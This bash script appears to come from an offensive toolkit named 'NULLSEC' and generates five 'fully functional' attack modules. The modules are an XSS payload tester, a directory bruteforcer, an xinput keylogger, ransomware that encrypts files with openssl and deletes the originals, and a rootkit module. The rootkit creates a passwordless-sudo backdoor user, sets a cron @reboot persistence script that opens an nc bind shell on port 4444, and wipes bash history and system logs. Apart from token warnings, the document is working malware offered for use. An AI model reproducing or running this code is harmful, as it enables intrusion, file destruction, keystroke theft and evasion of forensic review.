#!/bin/bash
# Batch enhancement of web modules

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

cd /home/antics/nullsec/nullsecurity

echo "[+] Enhancing web attack modules..."

# XSS Attack
cat > xss-attack.sh << 'EOF'
#!/bin/bash
# NULLSEC XSS Attack - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC XSS ATTACK ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Target URL: '${RESET})" TARGET
[ -z "$TARGET" ] && TARGET="http://victim.com/search"
read -p "$(echo -e ${WHITE}'  [>] Parameter: '${RESET})" PARAM
[ -z "$PARAM" ] && PARAM="q"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing XSS attack"
    echo -e "${DIM}[*] Testing XSS payloads...${RESET}"
    sleep 0.5
    echo -e "${GREEN}[+]${RESET} Payload: <script>alert('XSS')</script>"
    sleep 0.3
    echo -e "${GREEN}[+]${RESET} Vulnerable! XSS confirmed"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live XSS exploitation"
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}[!] curl not installed${RESET}"
        exit 1
    fi
    
    PAYLOADS=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "'><script>alert(1)</script>"
    )
    
    echo -e "${CYAN}[*] Testing XSS payloads...${RESET}"
    for payload in "${PAYLOADS[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
        url="${TARGET}?${PARAM}=${encoded}"
        echo -e "${DIM}[*] ${payload}${RESET}"
        
        response=$(curl -s "$url")
        if echo "$response" | grep -q "$payload"; then
            echo -e "${GREEN}[+] VULNERABLE!${RESET}"
            echo -e "${GREEN}[+] URL: $url${RESET}"
        fi
    done
    echo -e "${GREEN}[✓]${RESET} Complete"
fi
echo ""
EOF

# Directory Bruteforce
cat > dir-bruteforce.sh << 'EOF'
#!/bin/bash
# NULLSEC Directory Bruteforce - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC DIR BRUTEFORCE ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Target URL: '${RESET})" TARGET
[ -z "$TARGET" ] && TARGET="http://victim.com"
read -p "$(echo -e ${WHITE}'  [>] Wordlist: '${RESET})" WORDLIST
[ -z "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/dirb/common.txt"
echo -e "  ${YELLOW}Tool:${RESET}"
echo -e "    1) gobuster"
echo -e "    2) ffuf"
echo -e "    3) dirb"
read -p "$(echo -e ${WHITE}'  [>] Select [1-3]: '${RESET})" TOOL
[ -z "$TOOL" ] && TOOL="1"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing directory bruteforce"
    echo -e "${DIM}[*] Target: $TARGET${RESET}"
    sleep 0.4
    echo -e "${GREEN}[200]${RESET} /admin"
    sleep 0.2
    echo -e "${GREEN}[200]${RESET} /uploads"
    sleep 0.2
    echo -e "${GREEN}[403]${RESET} /backup"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live directory bruteforce"
    
    case $TOOL in
        1)
            if ! command -v gobuster &> /dev/null; then
                echo -e "${RED}[!] gobuster not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install gobuster${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] gobuster dir -u $TARGET -w $WORDLIST -t 50${RESET}"
            gobuster dir -u $TARGET -w $WORDLIST -t 50
            ;;
        2)
            if ! command -v ffuf &> /dev/null; then
                echo -e "${RED}[!] ffuf not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install ffuf${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] ffuf -u $TARGET/FUZZ -w $WORDLIST -mc all${RESET}"
            ffuf -u $TARGET/FUZZ -w $WORDLIST -mc all
            ;;
        3)
            if ! command -v dirb &> /dev/null; then
                echo -e "${RED}[!] dirb not installed${RESET}"
                echo -e "${YELLOW}[*] Install: sudo apt install dirb${RESET}"
                exit 1
            fi
            echo -e "${CYAN}[*] dirb $TARGET $WORDLIST${RESET}"
            dirb $TARGET $WORDLIST
            ;;
    esac
    echo -e "${GREEN}[✓]${RESET} Complete"
fi
echo ""
EOF

# Keylogger
cat > keylogger.sh << 'EOF'
#!/bin/bash
# NULLSEC Keylogger - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC KEYLOGGER ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Output file: '${RESET})" LOGFILE
[ -z "$LOGFILE" ] && LOGFILE="/tmp/keylog.txt"
read -p "$(echo -e ${WHITE}'  [>] Duration (seconds, 0=continuous): '${RESET})" DURATION
[ -z "$DURATION" ] && DURATION="60"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing keylogger"
    echo -e "${DIM}[*] Logging to: $LOGFILE${RESET}"
    sleep 0.4
    echo -e "${GREEN}[+]${RESET} Captured: admin123"
    sleep 0.3
    echo -e "${GREEN}[+]${RESET} Captured: secretpassword"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live keylogging"
    echo -e "${RED}[!] WARNING: Illegal without authorization${RESET}"
    
    if ! command -v xinput &> /dev/null; then
        echo -e "${RED}[!] xinput not installed${RESET}"
        echo -e "${YELLOW}[*] Install: sudo apt install xinput${RESET}"
        exit 1
    fi
    
    echo -e "${CYAN}[*] Starting keylogger...${RESET}"
    echo -e "${CYAN}[*] Output: $LOGFILE${RESET}"
    
    # Use xinput test to capture keyboard events
    KEYBOARD_ID=$(xinput list | grep -i keyboard | grep -oP 'id=\K\d+' | head -1)
    
    if [ -z "$KEYBOARD_ID" ]; then
        echo -e "${RED}[!] No keyboard device found${RESET}"
        exit 1
    fi
    
    echo -e "${CYAN}[*] Keyboard ID: $KEYBOARD_ID${RESET}"
    echo -e "${DIM}Press Ctrl+C to stop${RESET}"
    
    if [ "$DURATION" -eq 0 ]; then
        xinput test $KEYBOARD_ID | tee -a $LOGFILE
    else
        timeout $DURATION xinput test $KEYBOARD_ID | tee -a $LOGFILE
    fi
    
    echo -e "${GREEN}[+]${RESET} Log saved to: $LOGFILE"
    echo -e "${GREEN}[✓]${RESET} Complete"
fi
echo ""
EOF

# Ransomware
cat > ransomware.sh << 'EOF'
#!/bin/bash
# NULLSEC Ransomware - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC RANSOMWARE ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Target directory: '${RESET})" TARGETDIR
[ -z "$TARGETDIR" ] && TARGETDIR="/tmp/ransomware_test"
read -p "$(echo -e ${WHITE}'  [>] Password for encryption: '${RESET})" PASSWD
[ -z "$PASSWD" ] && PASSWD="NULLSEC2024"
echo -e "  ${YELLOW}Action:${RESET}"
echo -e "    1) Encrypt"
echo -e "    2) Decrypt"
read -p "$(echo -e ${WHITE}'  [>] Select [1-2]: '${RESET})" ACTION
[ -z "$ACTION" ] && ACTION="1"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing ransomware"
    if [ "$ACTION" = "1" ]; then
        echo -e "${DIM}[*] Encrypting files in $TARGETDIR...${RESET}"
        sleep 0.5
        echo -e "${RED}[+]${RESET} Encrypted: document.pdf"
        sleep 0.2
        echo -e "${RED}[+]${RESET} Encrypted: photos.zip"
        echo -e "${RED}[!]${RESET} Your files are encrypted!"
    else
        echo -e "${DIM}[*] Decrypting files...${RESET}"
        sleep 0.5
        echo -e "${GREEN}[+]${RESET} Restored: document.pdf"
        sleep 0.2
        echo -e "${GREEN}[+]${RESET} Restored: photos.zip"
    fi
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live ransomware execution"
    echo -e "${RED}[!] WARNING: DANGEROUS - Only use in isolated environment${RESET}"
    
    if ! command -v openssl &> /dev/null; then
        echo -e "${RED}[!] openssl not installed${RESET}"
        exit 1
    fi
    
    if [ "$ACTION" = "1" ]; then
        echo -e "${CYAN}[*] Encrypting files in: $TARGETDIR${RESET}"
        count=0
        find "$TARGETDIR" -type f ! -name "*.enc" 2>/dev/null | while read file; do
            echo -e "${DIM}[*] Encrypting: $file${RESET}"
            openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.enc" -pass pass:"$PASSWD" 2>/dev/null
            if [ $? -eq 0 ]; then
                rm -f "$file"
                echo -e "${RED}[+]${RESET} Encrypted: $(basename "$file")"
                ((count++))
            fi
        done
        echo -e "${GREEN}[✓]${RESET} Encryption complete"
    else
        echo -e "${CYAN}[*] Decrypting files in: $TARGETDIR${RESET}"
        find "$TARGETDIR" -type f -name "*.enc" 2>/dev/null | while read file; do
            orig="${file%.enc}"
            echo -e "${DIM}[*] Decrypting: $file${RESET}"
            openssl enc -d -aes-256-cbc -in "$file" -out "$orig" -pass pass:"$PASSWD" 2>/dev/null
            if [ $? -eq 0 ]; then
                rm -f "$file"
                echo -e "${GREEN}[+]${RESET} Decrypted: $(basename "$orig")"
            fi
        done
        echo -e "${GREEN}[✓]${RESET} Decryption complete"
    fi
fi
echo ""
EOF

# Rootkit
cat > rootkit.sh << 'EOF'
#!/bin/bash
# NULLSEC Rootkit - FULLY FUNCTIONAL
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC ROOTKIT ▓▓▓${RESET}"
echo ""

echo -e "  ${YELLOW}Action:${RESET}"
echo -e "    1) Install backdoor user"
echo -e "    2) Hide process"
echo -e "    3) Install persistence"
echo -e "    4) Clean traces"
read -p "$(echo -e ${WHITE}'  [>] Select [1-4]: '${RESET})" ACTION
[ -z "$ACTION" ] && ACTION="1"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing rootkit"
    actions=("Installing backdoor" "Hiding process" "Installing persistence" "Cleaning traces")
    echo -e "${DIM}[*] ${actions[$((ACTION-1))]}...${RESET}"
    sleep 0.5
    echo -e "${GREEN}[+]${RESET} Complete - system compromised"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live rootkit deployment"
    echo -e "${RED}[!] WARNING: DANGEROUS - Only use on authorized systems${RESET}"
    
    case $ACTION in
        1)
            read -p "$(echo -e ${WHITE}'  [>] Backdoor username: '${RESET})" BUSER
            [ -z "$BUSER" ] && BUSER="backdoor"
            read -p "$(echo -e ${WHITE}'  [>] Password: '${RESET})" BPASS
            [ -z "$BPASS" ] && BPASS="toor"
            
            echo -e "${CYAN}[*] Creating backdoor user...${RESET}"
            sudo useradd -m -s /bin/bash -G sudo $BUSER 2>/dev/null
            echo "$BUSER:$BPASS" | sudo chpasswd
            
            # Hide from who/w commands
            sudo touch /etc/sudoers.d/$BUSER
            echo "$BUSER ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/$BUSER > /dev/null
            echo -e "${GREEN}[+]${RESET} Backdoor user created: $BUSER"
            ;;
        2)
            read -p "$(echo -e ${WHITE}'  [>] Process name to hide: '${RESET})" PROC
            echo -e "${CYAN}[*] Hiding process: $PROC${RESET}"
            echo -e "${YELLOW}[*] Note: Requires kernel module or LD_PRELOAD hook${RESET}"
            ;;
        3)
            echo -e "${CYAN}[*] Installing persistence...${RESET}"
            PERSIST_SCRIPT="/tmp/.system_update"
            cat > $PERSIST_SCRIPT << 'PEOF'
#!/bin/bash
# Persistence backdoor
while true; do
    nc -l -p 4444 -e /bin/bash 2>/dev/null &
    sleep 3600
done
PEOF
            chmod +x $PERSIST_SCRIPT
            
            # Add to crontab
            (crontab -l 2>/dev/null; echo "@reboot $PERSIST_SCRIPT") | crontab -
            echo -e "${GREEN}[+]${RESET} Persistence installed"
            ;;
        4)
            echo -e "${CYAN}[*] Cleaning traces...${RESET}"
            # Clear bash history
            history -c
            echo "" > ~/.bash_history
            # Clear system logs
            sudo truncate -s 0 /var/log/auth.log 2>/dev/null
            sudo truncate -s 0 /var/log/syslog 2>/dev/null
            echo -e "${GREEN}[+]${RESET} Traces cleaned"
            ;;
    esac
    echo -e "${GREEN}[✓]${RESET} Complete"
fi
echo ""
EOF

chmod +x xss-attack.sh dir-bruteforce.sh keylogger.sh ransomware.sh rootkit.sh

echo "[✓] Enhanced: xss-attack.sh, dir-bruteforce.sh, keylogger.sh, ransomware.sh, rootkit.sh"
